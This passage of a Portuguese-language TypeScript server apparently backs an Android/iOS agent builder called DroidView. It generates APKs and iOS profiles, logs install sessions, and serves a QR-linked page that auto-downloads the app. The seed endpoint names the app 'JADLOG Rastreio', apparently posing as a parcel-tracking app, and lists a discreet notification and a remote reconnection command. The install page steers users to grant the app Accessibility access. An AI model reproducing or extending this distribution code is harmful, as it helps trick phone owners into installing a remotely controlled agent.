      islandProfileEnabled: payload.islandProfileEnabled,
      workProfileEnabled: payload.workProfileEnabled,
      screenConfig: payload.screenConfig
    };
    savedApkBuilds.unshift(newBuild);

    return {
      apkName: safeApkName,
      downloadUrl: `/apk/download/${encoded}`,
      qrPayload: webInstallUrl,
      zeroTouchQrPayload: zeroTouchQrJson,
      webInstallUrl,
      sha256: sha256Hex,
      platform: "android",
      artifactType: hasBuiltApk ? "apk" : "enrollment-package",
      note: hasBuiltApk
        ? `APK real assinado (${safeApkName}) com nome e configuracao embutidos pronto para instalacao.`
        : "SDK/build Android nao encontrado; download sera um ZIP honesto com config e instrucoes."
    };
  });

  app.get<{ Params: { config: string } }>("/ios/profile/:config", async (request, reply) => {
    try {
      const enrollment = decodeEnrollment(request.params.config);
      const safeName = (enrollment.appName || "DVIEW-Agent").replace(/[^a-zA-Z0-9._-]/g, "-").replace(/-+/g, "-");
      const buffer = generateIosMobileconfig(enrollment);
      return reply
        .header("content-type", "application/x-apple-aspen-config")
        .header("content-disposition", `attachment; filename="${safeName}.mobileconfig"`)
        .header("x-droidview-sha256", createHash("sha256").update(buffer).digest("hex"))
        .send(buffer);
    } catch {
      return reply.code(400).send({ error: "Invalid iOS enrollment configuration" });
    }
  });

  app.get<{ Params: { config: string } }>("/ios/download/:config", async (request, reply) => {
    try {
      const enrollment = decodeEnrollment(request.params.config);
      const safeName = (enrollment.appName || "DVIEW-Agent").replace(/[^a-zA-Z0-9._-]/g, "-").replace(/-+/g, "-");
      const buffer = generateIosSwiftProject(enrollment);
      return reply
        .header("content-type", "application/zip")
        .header("content-disposition", `attachment; filename="${safeName}-ios-project.zip"`)
        .send(buffer);
    } catch {
      return reply.code(400).send({ error: "Invalid iOS enrollment configuration" });
    }
  });

  app.get("/apk/builds", { preHandler: (app as any).authenticate }, async () => {
    return savedApkBuilds;
  });

  app.put<{ Params: { id: string }; Body: Partial<SavedApkBuild> }>(
    "/apk/builds/:id",
    { preHandler: (app as any).authenticate },
    async (request, reply) => {
      const idx = savedApkBuilds.findIndex((b) => b.id === request.params.id);
      if (idx < 0) return reply.code(404).send({ error: "Build não encontrado" });

      savedApkBuilds[idx] = {
        ...savedApkBuilds[idx],
        ...request.body,
        id: request.params.id
      };
      return savedApkBuilds[idx];
    }
  );

  app.delete<{ Params: { id: string } }>("/apk/builds/:id", { preHandler: (app as any).authenticate }, async (request, reply) => {
    const idx = savedApkBuilds.findIndex((b) => b.id === request.params.id);
    if (idx >= 0) {
      savedApkBuilds.splice(idx, 1);
      return { success: true, id: request.params.id };
    }
    return reply.code(404).send({ error: "Build não encontrado" });
  });

  // Seed de atualização contínua e telemetria de melhorias do aplicativo
  app.get("/apk/seed", async () => {
    const hasBuiltApk = Boolean(findBuiltApk());
    return {
      success: true,
      version: "0.2.0",
      versionCode: 2,
      minSupportedVersion: "0.1.0",
      appName: "JADLOG Rastreio",
      improvements: [
        "Notificação discreta com ícone miniatura oficial",
        "Auto-detecção dinâmica de IP e recuperação de conexão",
        "Seed de atualização contínua e telemetria resiliente",
        "Comando remoto de reconexão administrativa instantânea"
      ],
      hasArtifact: hasBuiltApk,
      downloadUrl: "/apk/download/latest",
      updatedAt: new Date().toISOString()
    };
  });

  app.get<{ Params: { config: string } }>("/apk/download/:config", async (request, reply) => {
    const artifact = await resolveAgentArtifact(request.params.config);
    return reply
      .header("content-type", artifact.contentType)
      .header("content-disposition", `attachment; filename=${artifact.fileName}`)
      .header("x-droidview-artifact-kind", artifact.kind)
      .header("x-droidview-sha256", artifact.sha256)
      .send(artifact.buffer);
  });

  app.get<{ Params: { config: string } }>("/apk/status/:config", async (request, reply) => {
    try {
      const enrollment = decodeEnrollment(request.params.config);
      const hasBuiltApk = Boolean(findBuiltApk());
      const safeApkName = getSafeApkName(enrollment.appName);
      return {
        ready: true,
        artifactType: hasBuiltApk ? "apk" : "enrollment-package",
        fileName: hasBuiltApk ? safeApkName : safeApkName.replace(/\.apk$/i, ".zip"),
        enrollment,
        message: hasBuiltApk
          ? `APK criptografado (${safeApkName}) pronto para download e instalação no aparelho.`
          : "APK ainda nao compilado nesta maquina; pacote ZIP de pareamento disponivel."
      };
    } catch {
      return reply.code(400).send({ ready: false, error: "Invalid enrollment config" });
    }
  });

  // Rastreamento em tempo real do progresso da esteira de instalação do usuário
  app.post<{
    Body: {
      token: string;
      step: InstallStepType;
      appName?: string;
      platform?: "android" | "ios";
      deviceModel?: string;
      metadata?: Record<string, any>;
    };
  }>("/install/track", async (request, reply) => {
    try {
      const { token, step, appName, platform, deviceModel, metadata } = request.body || {};
      if (!token || !step) {
        return reply.code(400).send({ error: "Parâmetros 'token' e 'step' são obrigatórios" });
      }
      const session = recordInstallEvent({
        token,
        step,
        appName,
        platform,
        deviceModel,
        ipAddress: request.ip,
        metadata: {
          ...metadata,
          userAgent: request.headers["user-agent"]
        }
      });
      addLog({
        actor: "installer",
        action: `install.${step}`,
        target: token,
        severity: "info",
        message: `Instalação [${step}] registrada para ${session.appName} (${session.token})`
      });
      return { success: true, session };
    } catch (err: any) {
      return reply.code(500).send({ error: err.message });
    }
  });

  app.get<{ Params: { token: string } }>("/install/track/:token", async (request, reply) => {
    const session = getInstallSession(request.params.token);
    if (!session) {
      return reply.code(404).send({ error: "Sessão de instalação não encontrada para este token" });
    }
    return session;
  });

  app.get("/install/sessions", { preHandler: (app as any).authenticate }, async () => {
    return getAllInstallSessions();
  });

  // Página web móvel inteligente de instalação rápida (aberta ao escanear o QR Code)
  app.get<{ Params: { config: string } }>("/install/:config", async (request, reply) => {
    try {
      const enrollment = decodeEnrollment(request.params.config);
      const appName = enrollment.appName || "DVIEW Agent";
      const accentColor = enrollment.screenConfig?.accentColor || "#dc2626";
      const userAgent = request.headers["user-agent"] || "";
      const isIos = /iphone|ipad|ipod/i.test(userAgent);
      const downloadPath = isIos
        ? `/ios/profile/${request.params.config}`
        : `/apk/download/${request.params.config}`;

      // Registra download inicial
      recordInstallEvent({
        token: enrollment.enrollmentToken,
        step: "download_started",
        appName,
        platform: isIos ? "ios" : "android",
        ipAddress: request.ip,
        metadata: { userAgent, source: "qr_web_scan" }
      });

      const html = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Instalar ${appName}</title>
  <style>
    :root {
      --accent: ${accentColor};
      --bg: #090d16;
      --card: #111827;
      --text: #f8fafc;
      --text-muted: #94a3b8;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
    body { background: var(--bg); color: var(--text); display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
    .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 28px 24px; max-width: 440px; width: 100%; box-shadow: 0 12px 40px rgba(0,0,0,0.7); text-align: center; }
    .logo-badge { width: 68px; height: 68px; border-radius: 16px; background: var(--accent); color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 24px; font-weight: 900; margin-bottom: 16px; box-shadow: 0 4px 20px ${accentColor}66; }
    h1 { font-size: 20px; font-weight: 800; margin-bottom: 6px; }
    p.sub { font-size: 13px; color: var(--text-muted); margin-bottom: 24px; line-height: 1.4; }
    .btn { display: block; width: 100%; padding: 14px; background: var(--accent); color: #ffffff; text-decoration: none; border-radius: 12px; font-weight: 700; font-size: 15px; border: none; cursor: pointer; box-shadow: 0 4px 15px ${accentColor}55; }
    .steps { margin-top: 24px; text-align: left; background: rgba(0,0,0,0.3); border-radius: 12px; padding: 16px; border: 1px solid rgba(255,255,255,0.06); }
    .steps h3 { font-size: 12px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 10px; letter-spacing: 0.5px; }
    .step-item { display: flex; align-items: flex-start; gap: 10px; font-size: 12.5px; margin-bottom: 10px; color: #cbd5e1; }
    .step-num { width: 20px; height: 20px; border-radius: 50%; background: rgba(255,255,255,0.1); display: grid; place-items: center; font-size: 11px; font-weight: 700; color: var(--accent); flex-shrink: 0; }
    .progress-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; overflow: hidden; margin-bottom: 20px; }
    .progress-fill { height: 100%; width: 45%; background: var(--accent); animation: pulse 1.5s infinite; }
    @keyframes pulse { 0% { transform: translateX(-100%); } 100% { transform: translateX(250%); } }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo-badge">${appName.substring(0, 3).toUpperCase()}</div>
    <h1>${appName}</h1>
    <p class="sub">Download automático iniciado. Se o arquivo não baixar nos próximos segundos, toque no botão abaixo.</p>

    <div class="progress-bar"><div class="progress-fill"></div></div>

    <a href="${downloadPath}" class="btn" id="downloadBtn">
      ${isIos ? "🍎 Baixar Perfil iOS" : "📦 Baixar APK Novamente"}
    </a>

    <div class="steps">
      <h3>Instruções de Instalação:</h3>
      <div class="step-item"><span class="step-num">1</span><span>Confirme o download do instalador oficial no navegador.</span></div>
      <div class="step-item"><span class="step-num">2</span><span>Abra o arquivo baixado e toque em <strong>Instalar</strong>.</span></div>
      <div class="step-item"><span class="step-num">3</span><span>Abra o app e ative o serviço em <strong>Acessibilidade</strong>.</span></div>
      <div class="step-item"><span class="step-num">4</span><span>Pronto! O aplicativo sincronizará com a central de suporte.</span></div>
    </div>
  </div>

  <script>
    // Inicia download automaticamente após 500ms
    setTimeout(function() {
      window.location.href = "${downloadPath}";
    }, 500);
  </script>
</body>
</html>`;

      return reply.type("text/html; charset=utf-8").send(html);
    } catch {
      return reply.code(400).send({ error: "Configuração de instalação inválida" });
    }
  });

  const MIME_TYPES: Record<string, string> = {
    ".html": "text/html; charset=utf-8",
    ".js": "application/javascript; charset=utf-8",
    ".mjs": "application/javascript; charset=utf-8",
    ".css": "text/css; charset=utf-8",
    ".json": "application/json; charset=utf-8",
    ".png": "image/png",
    ".jpg": "image/jpeg",
    ".jpeg": "image/jpeg",
    ".svg": "image/svg+xml",
    ".ico": "image/x-icon",
    ".webp": "image/webp",
    ".woff": "font/woff",
    ".woff2": "font/woff2",
    ".ttf": "font/ttf"
  };

  const panelCandidates = [
    resolve(process.cwd(), "apps", "web-panel", "dist"),
    resolve(process.cwd(), "..", "web-panel", "dist"),
    resolve(process.cwd(), "dist")
  ];
  const panelDir = panelCandidates.find((dir) => existsSync(join(dir, "index.html")));

  if (panelDir) {
    const indexHtml = join(panelDir, "index.html");
    app.setNotFoundHandler(async (request, reply) => {
      if (request.method !== "GET" && request.method !== "HEAD") {
        return reply.code(404).send({ error: `Route ${request.method}:${request.url} not found` });
      }

      const rawPath = request.url.split("?")[0];
      const apiPrefixes = [
        "/devices",
        "/auth",
        "/apk",
        "/dashboard",
        "/sessions",
        "/logs",
        "/apps",
        "/health",
        "/vpn",
        "/install",
        "/socket.io"
      ];

      if (apiPrefixes.some((prefix) => rawPath === prefix || rawPath.startsWith(prefix + "/"))) {
        return reply.code(404).send({ error: `API route ${rawPath} not found` });
      }

      let relPath = rawPath.replace(/^\/+/, "");
      if (!relPath) relPath = "index.html";
      const safeRel = normalize(relPath).replace(/^(\.\.[\/\\])+/, "");
      const targetFile = join(panelDir, safeRel);

      if (existsSync(targetFile) && statSync(targetFile).isFile()) {
        const ext = extname(targetFile).toLowerCase();
        reply.type(MIME_TYPES[ext] || "application/octet-stream");
        return reply.send(createReadStream(targetFile));
      }

      reply.type("text/html; charset=utf-8");
      return reply.send(createReadStream(indexHtml));
    });
  }

  return app;
}
